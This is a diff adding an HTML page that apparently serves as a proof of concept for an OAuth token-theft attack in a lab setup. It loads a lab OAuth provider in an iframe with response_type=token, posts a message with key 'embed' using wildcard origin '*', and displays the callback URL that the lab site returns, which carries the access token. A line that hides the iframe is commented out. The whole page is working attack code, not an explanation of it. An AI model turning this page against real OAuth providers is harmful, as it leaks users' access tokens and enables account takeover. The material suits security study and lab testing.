@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>PostMessage Interaction</title>
+</head>
+
+<body>
+    <h2>PostMessage Interaction with OAuth Provider</h2>
+    <button id="sendMessageButton">Send PostMessage</button>
+    <div id="response" style="margin-top: 20px; color: blue;"></div>
+
+    <script>
+        document.getElementById('sendMessageButton').addEventListener('click', () => {
+            // Open the target iframe
+            const iframe = document.createElement('iframe');
+            // iframe.style.display = 'none'; // Hide iframe
+            iframe.src = 'http://lab-provider.com:9001/oauth?redirect_uri=http%3A%2F%2Flab-site.com%3A9000%2Fcallback&response_type=token&application_id=574a33452ec5e4fc2bfa60d049a70c57';
+            document.body.appendChild(iframe);
+
+            // Send a postMessage to the iframe once it loads
+            iframe.onload = () => {
+                // Send the message with key 'embed'
+                iframe.contentWindow.postMessage({ key: 'embed' }, '*');
+            };
+        });
+
+        // Listen for incoming messages
+        window.addEventListener('message', (event) => {
+            // Check if the message comes from the expected origin
+            if (event.origin === 'http://lab-site.com:9000') {
+                // Display the received URL in the response div
+                const responseDiv = document.getElementById('response');
+                responseDiv.textContent = 'Received URL: ' + event.data.detail.url;
+            } else {
+                console.warn("Message received from unexpected origin:", event.origin);
+            }
+        });
+    </script>
+</body>
+
+</html>
